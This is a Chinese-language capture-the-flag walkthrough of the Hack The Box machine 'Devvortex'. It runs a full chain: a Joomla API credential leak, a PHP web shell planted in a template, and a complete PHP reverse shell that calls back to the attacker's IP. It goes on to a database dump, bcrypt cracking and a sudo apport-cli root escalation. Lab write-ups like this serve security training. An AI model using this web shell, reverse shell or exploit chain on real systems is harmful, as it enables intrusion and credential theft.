```
┌──(root㉿kali)-[~]
└─# nmap -p- --open -Pn 10.10.11.242          
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-27 22:29 EST
Nmap scan report for 10.10.11.242
Host is up (0.41s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 82.48 seconds
                                                                                                                    
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.242 -p 22,80    
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-27 22:31 EST
Nmap scan report for 10.10.11.242
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   221.53 ms 10.10.16.1
2   387.91 ms 10.10.11.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.49 seconds

```

# 加域名
```
echo "10.10.11.242 devvortex.htb" >> /etc/hosts
```



# vhost

```
┌──(root㉿kali)-[~]
└─# gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/SecLists-2023.2/Discovery/DNS/subdomains-top1million-110000.txt --append-domain --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/SecLists-2023.2/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]

```

把这个域名也加进配置文件

```
echo "10.10.11.242 dev.devvortex.htb" >> /etc/hosts
```


#web brute

```
┌──(root㉿kali)-[~/htb/Devvortex]
└─# python3 /root/dirsearch/dirsearch.py -u http://dev.devvortex.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10929

Output File: /root/dirsearch/reports/dev.devvortex.htb/-_24-02-28_01-10-23.txt

Error Log: /root/dirsearch/logs/errors-24-02-28_01-10-23.log

Target: http://dev.devvortex.htb/

[01:10:24] Starting:          
[01:10:51] 200 -   18KB - /LICENSE.txt                                      
[01:10:53] 200 -    5KB - /README.txt                                       
[01:11:21] 403 -  564B  - /admin/.config                                    
[01:11:21] 403 -  564B  - /admin/.htaccess                                  
[01:11:48] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[01:11:48] 403 -  564B  - /administrator/.htaccess                          
[01:11:48] 403 -  564B  - /administrator/includes/                          
[01:11:48] 200 -   31B  - /administrator/cache/
[01:11:48] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[01:11:48] 200 -   31B  - /administrator/logs/
[01:11:49] 200 -   12KB - /administrator/                                   
[01:11:49] 200 -   12KB - /administrator/index.php                          
[01:11:54] 403 -  564B  - /admpar/.ftppass                                  
[01:11:55] 403 -  564B  - /admrev/.ftppass                                  
[01:11:56] 301 -  178B  - /api  ->  http://dev.devvortex.htb/api/           
[01:12:13] 301 -  178B  - /cache  ->  http://dev.devvortex.htb/cache/       
[01:12:13] 200 -   31B  - /cache/
[01:12:13] 403 -    4KB - /cache/sql_error_latest.cgi                       
[01:12:15] 400 -  166B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[01:12:18] 200 -   31B  - /cli/                                             
[01:12:21] 301 -  178B  - /components  ->  http://dev.devvortex.htb/components/
[01:12:21] 200 -   31B  - /components/                                      
[01:12:25] 200 -    0B  - /configuration.php                                
[01:12:47] 403 -  564B  - /ext/.deps                                        
[01:12:59] 200 -   23KB - /home                                             
[01:12:59] 200 -    7KB - /htaccess.txt
[01:13:02] 301 -  178B  - /images  ->  http://dev.devvortex.htb/images/     
[01:13:02] 200 -   31B  - /images/                                          
[01:13:03] 403 -    4KB - /images/Sym.php                                   
[01:13:03] 403 -    4KB - /images/c99.php
[01:13:04] 301 -  178B  - /includes  ->  http://dev.devvortex.htb/includes/ 
[01:13:04] 200 -   31B  - /includes/                                        
[01:13:05] 200 -   23KB - /index.php                                        
[01:13:06] 200 -   23KB - /index.php.                                       
[01:13:13] 301 -  178B  - /language  ->  http://dev.devvortex.htb/language/ 
[01:13:13] 200 -   31B  - /layouts/                                                            
[01:13:14] 301 -  178B  - /libraries  ->  http://dev.devvortex.htb/libraries/
[01:13:14] 200 -   31B  - /libraries/                                       
[01:13:22] 403 -  564B  - /mailer/.env                                      
[01:13:25] 301 -  178B  - /media  ->  http://dev.devvortex.htb/media/       
[01:13:25] 200 -   31B  - /media/                                           
[01:13:30] 301 -  178B  - /modules  ->  http://dev.devvortex.htb/modules/   
[01:13:30] 200 -   31B  - /modules/                                         
[01:13:53] 301 -  178B  - /plugins  ->  http://dev.devvortex.htb/plugins/   
[01:13:53] 200 -   31B  - /plugins/                                         
[01:14:03] 403 -  564B  - /resources/.arch-internal-preview.css             
[01:14:03] 403 -  564B  - /resources/sass/.sass-cache/
[01:14:05] 200 -  764B  - /robots.txt                                       
[01:14:27] 301 -  178B  - /templates  ->  http://dev.devvortex.htb/templates/
[01:14:27] 200 -   31B  - /templates/                                       
[01:14:27] 200 -   31B  - /templates/index.html
[01:14:28] 200 -    0B  - /templates/system/                                
[01:14:30] 301 -  178B  - /tmp  ->  http://dev.devvortex.htb/tmp/           
[01:14:30] 200 -   31B  - /tmp/                                                                                
[01:14:42] 200 -    3KB - /web.config.txt   

```

README.txt 信息

网站是一个叫```Joomla! CMS```的web app，版本：4.x


搜索这个cms的exploit，参考[这篇](https://vulncheck.com/blog/joomla-for-rce)

发送一条命令：
```
┌──(root㉿kali)-[~/htb/Devvortex]
└─# curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
* Host dev.devvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.242
*   Trying 10.10.11.242:80...
* Connected to dev.devvortex.htb (10.10.11.242) port 80
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 28 Feb 2024 06:23:24 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Wed, 28 Feb 2024 06:23:24 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}} 
```

暴露一组凭据：```lewis:P4ntherg0t1n5r3c0n##```


可以登录到administrator后台


编辑```/templates/cassiopeia/error.php```，加php evil code

```
if(isset($_GET['cmd'])){
	$cmd = $_GET['cmd'];
	
	system($cmd);
}

```

然后随便访问一个不存在的页面，加上cmd参数，拿到web shell。如：

> http://dev.devvortex.htb/888?cmd=id

下面payload拿到rev shell

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.3';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

```


拿到shell

```
┌──(root㉿kali)-[~]
└─# nc -lnvp 80 
listening on [any] 80 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.242] 48576
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 07:00:41 up  3:34,  0 users,  load average: 0.02, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c "__import__('pty').spawn('/bin/bash')"
www-data@devvortex:/$ 
```

数据库密码
```
www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php                                                       
cat configuration.php                                                                                               
<?php                                                                                                               
class JConfig {                                                                                                     
        public $offline = false;                                                                                    
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';            
        public $display_offline_message = 1;                                                                        
        public $offline_image = '';                                                                                 
        public $sitename = 'Development';                                                                           
        public $editor = 'tinymce';                                                                                 
        public $captcha = '0';                                                                                      
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';

```


同样用```lewis:P4ntherg0t1n5r3c0n##```登录数据库


```
www-data@devvortex:/home/logan$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8807
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> 

```

用户列表:
```
mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-02-28 06:27:00 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql> 

```

破解logan的哈希
```
┌──(root㉿kali)-[~/htb/Devvortex]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:22 DONE (2024-02-28 02:15) 0.04474g/s 62.81p/s 62.81c/s 62.81C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

ssh登录，拿到flag
```
┌──(root㉿kali)-[~/htb/Devvortex]
└─# ssh logan@devvortex.htb
The authenticity of host 'devvortex.htb (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:41: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 28 Feb 2024 07:15:38 AM UTC

  System load:           0.55
  Usage of /:            65.8% of 4.76GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             166
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.242
  IPv6 address for eth0: dead:beef::250:56ff:feb9:335


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ cat user.txt
413b22ac39aafa495a7804f21dbdddc6
logan@devvortex:~$ 

```


# 提权

sudo特权
```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ 

```


参考[这篇文章](https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/)的提权方法

拿到flag
```
...

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
root@devvortex:/home/logan# cd ~
root@devvortex:~# ls
root.txt
root@devvortex:~# cat root.txt
17bd245ea135fbd8521009df5ce3b85f
root@devvortex:~# 

```